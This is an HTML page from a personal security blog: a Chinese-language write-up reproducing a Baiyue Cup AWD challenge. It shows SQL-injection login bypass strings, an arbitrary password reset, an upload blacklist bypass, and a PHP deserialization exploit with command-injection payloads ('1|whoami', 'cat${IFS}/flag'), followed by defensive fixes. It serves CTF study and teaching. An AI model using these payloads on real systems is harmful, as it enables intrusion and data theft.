@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          百越杯AWD攻防源码复现分析 - 信息安全个人wiki&amp;blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>信息安全个人WIKI&amp;BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/note">Notes</a></li>
+</ul>
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
+<li><a href="/contents/xss">WebSecurity-xss</a></li>
+<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
+<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
+<li><a href="/contents/FI">WebSecurity-FI</a></li>
+<li><a href="/contents/rce">WebSecurity-rce</a></li>
+<li><a href="/contents/upload">WebSecurity-upload</a></li>
+<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
+</ul>
+<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
+<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
+<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
+<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
+<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
+</ul>
+<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
+<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
+<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
+<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
+<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
+<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
+<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
+</ul>
+<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
+<li><a href="/contents/login">登录框渗透总结</a></li>
+<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
+<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
+<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
+</ul>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
+<li>待补充</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
+<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
+<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
+</ul>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li>待补充</li>
+</ul>
+<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
+<li><a href="/contents/tools">一些工具的使用命令</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>去年的<code>awd</code>题目，因为太菜都没摸到题，今天恰巧下载到了源码，于是准备来一波复现<a id="more"></a></p>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p><code>phpstudy+apache</code></p>
+<p>拿到源码放在<code>php</code>根目录下，修改下<code>config.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">"DBHOST"</span>,<span class="string">"127.0.0.1"</span>);</span><br><span class="line">define(<span class="string">'DBUSER'</span>,<span class="string">'root'</span>);</span><br><span class="line">define(<span class="string">'DBPASS'</span>,<span class="string">'root'</span>);</span><br><span class="line">define(<span class="string">'DBNAME'</span>,<span class="string">'awd'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后去数据库里创个<code>awd</code>数据库<code>user</code>表<code>username</code>和<code>password</code>字段</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="0x01万能密码"><a href="#0x01万能密码" class="headerlink" title="0x01万能密码"></a>0x01万能密码</h3><p><code>User.php</code>中登录函数中用户名没用做任何过滤直接传递到数据库查询语句中，因此可以万能密码</p>
+<p><code>admin&#39;or  1#</code>或者<code>&#39;or 1#</code>绕过登录，具体如下</p>
+<p><code>&quot;select * from users where user=&#39;admin&#39;or 1#&#39; and password=&#39;&#39;or 1#&#39;&quot;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">            $username=$_POST[<span class="string">'username'</span>];</span><br><span class="line">            $password=md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">            $sql=<span class="string">"select * from user where username='$username' and password='$password'"</span>;</span><br><span class="line"></span><br><span class="line">            $result = mysql_query($sql,<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">            $data = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span>($result &amp;&amp; mysql_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                $data = mysql_fetch_assoc($result); </span><br><span class="line">                $_SESSION[<span class="string">'username'</span>]=$username;</span><br><span class="line"></span><br><span class="line">                header(<span class="string">"Location: ./index.php?c=User&amp;a=home"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">"password error!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02任意密码重置"><a href="#0x02任意密码重置" class="headerlink" title="0x02任意密码重置"></a>0x02任意密码重置</h3><p><code>user.php</code>中在重置密码的时候仅需要用户名和新密码即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updatepass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">            $username=addslashes($_POST[<span class="string">'username'</span>]);</span><br><span class="line">            $password=md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">            $sql=<span class="string">"update user set password='$password' where username='$username' "</span>;</span><br><span class="line">            <span class="keyword">if</span> (mysql_query($sql))&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"success.tpl"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03上传漏洞"><a href="#0x03上传漏洞" class="headerlink" title="0x03上传漏洞"></a>0x03上传漏洞</h3><p><code>html.htaccess</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .html .xxx</span><br></pre></td></tr></table></figure>
+
+<p><code>user.php</code>中的<code>upload</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) <span class="keyword">and</span> $_SESSION[<span class="string">'username'</span>]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">            <span class="keyword">include_once</span> <span class="keyword">__DIR__</span>.<span class="string">"/File.php"</span>;</span><br><span class="line">            $up=<span class="keyword">new</span> File();</span><br><span class="line">            <span class="keyword">if</span>($up-&gt;save())&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"success.tpl"</span>);</span><br><span class="line">            &#125;       </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tp-&gt;display(<span class="string">"error.tpl"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>file.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;        </span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]))&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">"not login"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;typelist==<span class="keyword">array</span>(<span class="string">"image/jpeg"</span>,<span class="string">"image/jpg"</span>,<span class="string">"image/png"</span>,<span class="string">"image/gif"</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;notallow=<span class="keyword">array</span>(<span class="string">"php"</span>, <span class="string">"php5"</span>, <span class="string">"php3"</span>, <span class="string">"php4"</span>, <span class="string">"php7"</span>, <span class="string">"pht"</span>, <span class="string">"phtml"</span>, <span class="string">"htaccess"</span>,<span class="string">"html"</span>, <span class="string">"swf"</span>, <span class="string">"htm"</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path=<span class="string">'./upload'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这里是黑名单过滤，但是并没有过滤<code>xxx</code>后缀，因此可以直接上传<code>shell.xxx</code>或者大小写<code>php</code>绕过</p>
+<h3 id="0x04反序列化漏洞"><a href="#0x04反序列化漏洞" class="headerlink" title="0x04反序列化漏洞"></a>0x04反序列化漏洞</h3><p><code>/common/home.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ping -c 2 $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">    $a=@$_POST[<span class="string">'a'</span>];</span><br><span class="line">    @unserialize($a);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<p>首先有一个home类，然后通过post接受参数a，并对其进行反序列化。仔细观察home类，里面有几个方法。</p>
+<p><code>__construct</code>析构方法进行初始化操作，指定method和method和args。</p>
+<p><code>__destruct</code>析构方法在对象销毁时调用，其中使用了<a href="http://php.net/manual/en/function.call-user-func-array.php" target="_blank" rel="noopener">call_user_func_array()</a>，如果method中有ping，则会调用ping方法，其参数即为$args。</p>
+<p><code>ping</code>方法执行sysyem命令：<code>system(&quot;ping -c 2 $host&quot;);</code>，注意到host参数，由前即home类实例的host参数，由前即home类实例的args。</p>
+<p><code>waf</code>方法，将传入的字符串中的空格去掉。</p>
+<p><code>__wakeup</code>方法，在反序列化时会自动调用，其中实现的功能是将参数$args先经过mysql_escape_string()，然后去除两边空格（trim），调用waf方法去掉字符串中的空格。</p>
+<p>反序列化时候首先会执行 <code>__wakeup()</code> 魔术方法，然后再执行 <code>__destruct()</code> 方法。</p>
+<p>看到这里，思路就很明确啦。构造反序列化字符串，先经过<code>__wakeup</code>的过滤，在执行结束后利用<code>__destruct</code>调用ping方法，利用其中的system执行任意命令。</p>
+<p>构造exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ping -c 2 $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">print_r(<span class="string">"New a comical :)&lt;/br&gt;"</span>);</span><br><span class="line">$comical = <span class="keyword">new</span> home(<span class="string">"ping"</span>,<span class="keyword">array</span>(<span class="string">"1|whoami"</span>));</span><br><span class="line">print_r(<span class="string">"&lt;/br&gt;Get the serialize result:&lt;/br&gt;"</span>);</span><br><span class="line">$exp = serialize($comical);</span><br><span class="line">print_r($exp);</span><br><span class="line">print_r(<span class="string">"&lt;/br&gt;&lt;/br&gt;unserialize and pwn it&lt;/br&gt;"</span>);</span><br><span class="line">print_r(<span class="string">"exec: system(\"whoami\")&lt;/br&gt;The result:  "</span>);</span><br><span class="line">serialize($exp);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/awd_1.png" alt=""></p>
+<p>把序列化的结果<code>post</code>给a，并没有回显。这里的原因是<code>priviate</code>对象序列化后需要在成员名前面加上<code>’*’</code>。这些前缀值在任一侧都有空字节。 因此得用<code>%00</code>添加上去得到<code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=O:<span class="number">4</span>:<span class="string">"home"</span>:<span class="number">2</span>:&#123;s:<span class="number">12</span>:<span class="string">"%00home%00method"</span>;s:<span class="number">4</span>:<span class="string">"ping"</span>;s:<span class="number">10</span>:<span class="string">"%00home%00args"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">8</span>:<span class="string">"1|whoami"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后要改变命令在<code>whoami</code>和<code>s:8</code>处更改就好</p>
+<p>这里我们做到了<code>dir</code></p>
+<p><img src="/img/awd_2.png" alt=""></p>
+<p>由于本机环境是windows且没有配置flag文件所以做到这儿就算结束了</p>
+<p>比赛的时候还有一个坑点，就是waf方法过滤了空格 tab 回车</p>
+<p>这里可以用linux的绕过方法<code>\$\{IFS\}</code> 来代替空格</p>
+<p><a href="https://github.com/CHYbeta/WAF-Bypass/blob/master/ming-ling-zhu-ru/rao-guo-fang-fa.md" target="_blank" rel="noopener">linux中的一些绕过方法</a></p>
+<p>exp中更改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$comical &#x3D; new home(&quot;ping&quot;,array(&quot;1|cat\$&#123;IFS&#125;&#x2F;flag&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>得到flag的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:16:&quot;1|cat$&#123;IFS&#125;&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>由此我们可以得到两种方法</p>
+<ol>
+<li><p><code>updatepass()</code>重置<code>admin</code>密码(<code>url</code>直接调用函数即可<code>post</code>改密码)</p>
+<p>绕过上传shell</p>
+<p>通过shell拿flag</p>
+</li>
+<li><p>反序列化读flag</p>
+</li>
+</ol>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul>
+<li><p>在<code>updatepass</code>函数第一行加<code>exit()</code></p>
+</li>
+<li><p><code>upload</code>目录<code>chmod 000</code></p>
+</li>
+<li><p>黑名单中加入<code>xxx</code>后缀，<code>php</code>大小写后缀</p>
+</li>
+<li><p>将<code>@unserialize($a);</code> 注释</p>
+</li>
+</ul>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avater.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>comical</div>
+      <div>2018-08-13</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/ctf-awd/">ctf+awd</a>
+
+      <a class="tag-link" href="/tags/awd/" rel="tag">#awd</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
